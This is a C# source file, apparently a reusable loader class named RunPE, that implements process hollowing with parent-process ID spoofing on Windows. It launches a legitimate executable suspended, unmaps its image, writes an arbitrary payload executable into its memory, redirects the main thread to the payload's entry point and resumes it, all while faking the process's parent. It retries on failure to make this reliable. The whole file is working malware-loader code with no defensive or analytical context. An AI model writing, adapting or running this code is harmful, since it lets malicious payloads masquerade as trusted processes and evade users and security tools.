﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

/// <summary>
/// Process hollowing implementation for 32-bit and 64-bit process creation.
/// </summary>
public static class RunPE
{
	/// <summary>
	/// Creates a new process using the process hollowing technique.
	/// <para>The bitness of the current process, the created process and the payload must match.</para>
	/// </summary>
	/// <param name="path">The target executable path. This can be any existing file with the same bitness as the current process and <paramref name="payload" />.</param>
	/// <param name="commandLine">The commandline of the created process. This parameter is displayed in task managers, but is otherwise unused.</param>
	/// <param name="payload">The actual executable that is the payload of the new process, regardless of <paramref name="path" /> and <paramref name="commandLine" />.</param>
	/// <param name="parentProcessId">The spoofed parent process ID.</param>
	public static void Run(string path, string commandLine, byte[] payload, int parentProcessId)
	{
		// For 32-bit (and 64-bit?) process hollowing, this needs to be attempted several times.
		// This is a workaround to the well known stability issue of process hollowing.
		for (int i = 0; i < 5; i++)
		{
			int processId = 0;

			try
			{
				int ntHeader = BitConverter.ToInt32(payload, 0x3c);
				int sizeOfImage = BitConverter.ToInt32(payload, ntHeader + 0x18 + 0x38);
				int sizeOfHeaders = BitConverter.ToInt32(payload, ntHeader + 0x18 + 0x3c);
				int entryPoint = BitConverter.ToInt32(payload, ntHeader + 0x18 + 0x10);
				short numberOfSections = BitConverter.ToInt16(payload, ntHeader + 0x6);
				short sizeOfOptionalHeader = BitConverter.ToInt16(payload, ntHeader + 0x14);
				IntPtr imageBase = IntPtr.Size == 4 ? (IntPtr)BitConverter.ToInt32(payload, ntHeader + 0x18 + 0x1c) : (IntPtr)BitConverter.ToInt64(payload, ntHeader + 0x18 + 0x18);

				IntPtr parentProcessHandle = OpenProcess(0x80, false, parentProcessId);
				if (parentProcessHandle == IntPtr.Zero) throw new Exception();

				IntPtr parentProcessHandlePtr = Allocate(IntPtr.Size);
				Marshal.WriteIntPtr(parentProcessHandlePtr, parentProcessHandle);

				IntPtr attributeListSize = IntPtr.Zero;
				if (InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref attributeListSize) || attributeListSize == IntPtr.Zero) throw new Exception();

				IntPtr attributeList = Allocate((int)attributeListSize);
				if (!InitializeProcThreadAttributeList(attributeList, 1, 0, ref attributeListSize) ||
					attributeList == IntPtr.Zero ||
					!UpdateProcThreadAttribute(attributeList, 0, (IntPtr)0x20000, parentProcessHandlePtr, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero)) throw new Exception();

				// Use STARTUPINFOEX to implement process spoofing
				int startupInfoLength = IntPtr.Size == 4 ? 0x48 : 0x70;
				IntPtr startupInfo = Allocate(startupInfoLength);
				Marshal.Copy(new byte[startupInfoLength], 0, startupInfo, startupInfoLength);
				Marshal.WriteInt32(startupInfo, startupInfoLength);
				Marshal.WriteIntPtr(startupInfo, startupInfoLength - IntPtr.Size, attributeList);

				byte[] processInfo = new byte[IntPtr.Size == 4 ? 0x10 : 0x18];

				IntPtr context = Allocate(IntPtr.Size == 4 ? 0x2cc : 0x4d0);
				Marshal.WriteInt32(context, IntPtr.Size == 4 ? 0 : 0x30, 0x10001b);

				if (!CreateProcess(path, path + " " + commandLine, IntPtr.Zero, IntPtr.Zero, true, 0x80004, IntPtr.Zero, null, startupInfo, processInfo)) throw new Exception();
				processId = BitConverter.ToInt32(processInfo, IntPtr.Size * 2);
				IntPtr process = IntPtr.Size == 4 ? (IntPtr)BitConverter.ToInt32(processInfo, 0) : (IntPtr)BitConverter.ToInt64(processInfo, 0);

				ZwUnmapViewOfSection(process, imageBase);

				if (VirtualAllocEx(process, imageBase, (IntPtr)sizeOfImage, 0x3000, 0x40) == IntPtr.Zero ||
					WriteProcessMemory(process, imageBase, payload, sizeOfHeaders, IntPtr.Zero) == IntPtr.Zero) throw new Exception();

				for (short j = 0; j < numberOfSections; j++)
				{
					byte[] section = new byte[0x28];
					Buffer.BlockCopy(payload, ntHeader + 0x18 + sizeOfOptionalHeader + j * 0x28, section, 0, 0x28);

					int virtualAddress = BitConverter.ToInt32(section, 0xc);
					int sizeOfRawData = BitConverter.ToInt32(section, 0x10);
					int pointerToRawData = BitConverter.ToInt32(section, 0x14);

					byte[] rawData = new byte[sizeOfRawData];
					Buffer.BlockCopy(payload, pointerToRawData, rawData, 0, rawData.Length);

					if (WriteProcessMemory(process, (IntPtr)((long)imageBase + virtualAddress), rawData, rawData.Length, IntPtr.Zero) == IntPtr.Zero) throw new Exception();
				}

				IntPtr thread = IntPtr.Size == 4 ? (IntPtr)BitConverter.ToInt32(processInfo, 4) : (IntPtr)BitConverter.ToInt64(processInfo, 8);
				if (!GetThreadContext(thread, context)) throw new Exception();

				if (IntPtr.Size == 4)
				{
					IntPtr ebx = (IntPtr)Marshal.ReadInt32(context, 0xa4);
					if (WriteProcessMemory(process, (IntPtr)((int)ebx + 8), BitConverter.GetBytes((int)imageBase), 4, IntPtr.Zero) == IntPtr.Zero) throw new Exception();
					Marshal.WriteInt32(context, 0xb0, (int)imageBase + entryPoint);
				}
				else
				{
					IntPtr rdx = (IntPtr)Marshal.ReadInt64(context, 0x88);
					if (WriteProcessMemory(process, (IntPtr)((long)rdx + 16), BitConverter.GetBytes((long)imageBase), 8, IntPtr.Zero) == IntPtr.Zero) throw new Exception();
					Marshal.WriteInt64(context, 0x80, (long)imageBase + entryPoint);
				}

				if (!SetThreadContext(thread, context)) throw new Exception();
				if (ResumeThread(thread) == -1) throw new Exception();
			}
			catch
			{
				try
				{
					// If the current attempt failed, terminate the created process to not have suspended "leftover" processes.
					Process.GetProcessById(processId).Kill();
				}
				catch { }
				continue;
			}

			break;
		}
	}

	/// <summary>
	/// Allocates memory in the current process with the specified size. If this is a 64-bit process, the memory address is aligned by 16.
	/// </summary>
	/// <param name="size">The amount of memory, in bytes, to allocate.</param>
	/// <returns>An <see cref="IntPtr" /> pointing to the allocated memory.</returns>
	private static IntPtr Allocate(int size)
	{
		int alignment = IntPtr.Size == 4 ? 1 : 16;
		return (IntPtr)(((long)Marshal.AllocHGlobal(size + alignment / 2) + (alignment - 1)) / alignment * alignment);
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern IntPtr OpenProcess(int access, bool inheritHandle, int processId);
	[DllImport("kernel32.dll")]
	private static extern bool CreateProcess(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, IntPtr startupInfo, byte[] processInformation);
	[DllImport("kernel32.dll")]
	private static extern IntPtr VirtualAllocEx(IntPtr process, IntPtr address, IntPtr size, uint allocationType, uint protect);
	[DllImport("kernel32.dll")]
	private static extern IntPtr WriteProcessMemory(IntPtr process, IntPtr baseAddress, byte[] buffer, int size, IntPtr bytesWritten);
	[DllImport("ntdll.dll")]
	private static extern uint ZwUnmapViewOfSection(IntPtr process, IntPtr baseAddress);
	[DllImport("kernel32.dll")]
	private static extern bool SetThreadContext(IntPtr thread, IntPtr context);
	[DllImport("kernel32.dll")]
	private static extern bool GetThreadContext(IntPtr thread, IntPtr context);
	[DllImport("kernel32.dll")]
	private static extern int ResumeThread(IntPtr thread);
	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool InitializeProcThreadAttributeList(IntPtr attributeList, int attributeCount, int flags, ref IntPtr size);
	[DllImport("kernel32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	private static extern bool UpdateProcThreadAttribute(IntPtr attributeList, uint flags, IntPtr attribute, IntPtr value, IntPtr size, IntPtr previousValue, IntPtr returnSize);
}